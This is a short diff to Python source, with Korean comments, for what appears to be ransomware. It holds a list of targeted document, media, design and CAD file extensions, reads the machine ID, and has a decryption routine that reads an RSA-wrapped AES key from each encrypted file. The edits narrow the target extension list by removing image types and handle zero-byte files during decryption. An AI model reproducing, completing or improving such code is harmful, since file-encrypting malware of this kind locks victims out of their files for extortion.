@@ -24,7 +24,7 @@ iv = os.urandom(16)
 UUID = uuid.getnode()
 extlist = \
     ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
-     'jpg', 'jpeg', 'png', 'gif',
+     #'jpg', 'jpeg', 'png', 'gif',
      'mp3', 'wav', 'wma',
      'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
 
@@ -68,6 +68,8 @@ def dec(cipher, in_filename, out_filename=None):
         size_of_data = e_data[:11].lstrip(b'0').decode()
         #크기가 0 바이트일 때
         if(size_of_data == ''):
+            with open(out_filename, 'wb') as outfile:
+                pass
             return
         size_of_data = int(size_of_data)
         aes_key_enc = e_data[11:139]  # 암호화된 aes 키 (128바이트)
